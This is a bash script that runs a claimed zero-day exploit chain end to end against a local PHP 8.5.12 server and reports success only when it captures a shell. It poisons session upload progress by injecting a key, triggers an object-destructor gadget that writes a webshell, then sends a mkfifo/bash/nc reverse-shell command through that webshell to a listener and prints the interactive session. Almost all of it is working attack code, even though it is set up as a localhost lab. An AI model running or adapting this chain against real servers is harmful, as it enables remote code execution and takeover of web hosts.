#!/bin/bash
# ============================================================================
# REVSHHELL_E2E.sh — ONE COMMAND: full 0-day chain -> LIVE reverse shell.
# Victim: PHP 8.5.12 (fully patched, release source), key-injection chain
# (zero1 Finding B) -> gadget -> webshell -> detached revshell -> captured
# interactive session printed to stdout. Self-contained: builds nothing,
# cleans up after itself, exits 0 only on a captured shell.
# Requires: /tmp/php8512_build/plain2/sapi/cli/php (see package README build).
# ============================================================================
set -u
PHP=${1:-/tmp/php8512_build/plain2/sapi/cli/php}
ART=/mnt/c/Users/andre/Downloads/php2shell-claude
ROOT=/tmp/p2s_e2e
PORT=18260
LPORT=1360
URL=http://127.0.0.1:$PORT

[ -x "$PHP" ] || { echo "[FAIL] php binary not found: $PHP (build per README)"; exit 1; }

# ---- clean slate
pkill -f "cli/php -S 127.0.0.1:$PORT" 2>/dev/null; pkill -f rs_listener.py 2>/dev/null
pkill -f "cat /tmp/e2e_f" 2>/dev/null; rm -f /tmp/e2e_f
rm -rf $ROOT; mkdir -p $ROOT/html $ROOT/sess
# gen_payloads.php hardcodes the gadget path to /tmp/p2s_fin/html/... —
# symlink it here so the webshell lands in this lab's docroot.
rm -rf /tmp/p2s_fin; mkdir -p /tmp/p2s_fin; ln -s $ROOT/html /tmp/p2s_fin/html
sleep 1

cat > $ROOT/html/up.php <<'EOF'
<?php header("Content-Type: text/plain"); echo "[up] ok handler=" . ini_get("session.serialize_handler") . "\n";
EOF
cat > $ROOT/html/read.php <<'EOF'
<?php
class DeferredWriter { public $path; public $data;
    public function __destruct() { @file_put_contents($this->path, $this->data); } }
header("Content-Type: text/plain");
ini_set('session.use_strict_mode', '0');
ini_set('session.serialize_handler', 'php');
session_start();
echo "[read] PHP " . PHP_VERSION . " " . php_sapi_name() . " done\n";
EOF
cat > $ROOT/html/index.php <<'EOF'
<?php echo "e2e lab " . PHP_VERSION . "\n";
EOF

# ---- victim up (write side php_serialize = the CVE-2026-115560-class config)
PHP_CLI_SERVER_WORKERS=4 $PHP -S 127.0.0.1:$PORT \
    -d session.serialize_handler=php_serialize \
    -d session.save_path=$ROOT/sess \
    -d session.upload_progress.enabled=1 \
    -d session.upload_progress.cleanup=0 \
    -d session.upload_progress.min_freq=0 \
    -d session.use_strict_mode=0 \
    -t $ROOT/html > $ROOT/srv.log 2>&1 &
SPID=$!; disown
for i in $(seq 1 30); do curl -s -o /dev/null --max-time 1 $URL/ && break; sleep 0.3; done
kill -0 $SPID 2>/dev/null || { echo "[FAIL] victim did not start"; exit 1; }
echo "[1] victim up: PHP 8.5.12 cli-server, write side php_serialize"

# ---- listener
rm -f $ROOT/session.log
python3 $ART/poc_matrix/rs_listener.py $LPORT $ROOT/session.log &
LPID=$!; disown
sleep 1
echo "[2] listener on :$LPORT"

# ---- fire the chain
P=$(php $ART/gen_payloads.php | grep '^P_FIN85=' | cut -d= -f2-)
SID=e2esid000000000000000000000000
python3 $ART/up_client.py $PORT full $SID "$P" /up.php > /dev/null 2>&1
sleep 0.5
curl -s -b "PHPSESSID=$SID" $URL/read.php > /dev/null 2>&1
sleep 0.5
[ -f $ROOT/html/fin85_shell.php ] || { echo "[FAIL] chain did not fire"; kill -9 $SPID $LPID 2>/dev/null; exit 1; }
echo "[3] chain fired: webshell written (key injection -> gadget destructor)"

# ---- pop the shell (detached so the request can end; retry leg)
REV="setsid sh -c 'rm -f /tmp/e2e_f;mkfifo /tmp/e2e_f;(cat /tmp/e2e_f|bash -i 2>&1;echo SHELL-EOF)|nc 127.0.0.1 $LPORT >/tmp/e2e_f' >/dev/null 2>&1 </dev/null &"
for attempt in 1 2 3; do
  [ -f $ROOT/session.log ] && grep -q "CONNECTION FROM" $ROOT/session.log 2>/dev/null && break
  curl -s --max-time 8 --get --data-urlencode "c=$REV" "$URL/fin85_shell.php" > /dev/null 2>&1
  echo "[4] reverse shell delivery attempt $attempt sent; waiting..."
  for w in 1 2 3 4 5 6 7 8 9 10; do
    grep -q "CONNECTION FROM" $ROOT/session.log 2>/dev/null && break
    sleep 2
  done
done

wait $LPID 2>/dev/null
echo "================ LIVE REVERSE SHELL SESSION ================"
cat $ROOT/session.log
echo "============================================================"
grep -q "uid=" $ROOT/session.log 2>/dev/null \
  && { echo "[PASS] E2E: interactive shell through the 0-day chain on fully-patched PHP 8.5.12"; RC=0; } \
  || { echo "[FAIL] no session captured"; RC=1; }
kill -9 $SPID 2>/dev/null; pkill -f "cat /tmp/e2e_f" 2>/dev/null
exit $RC
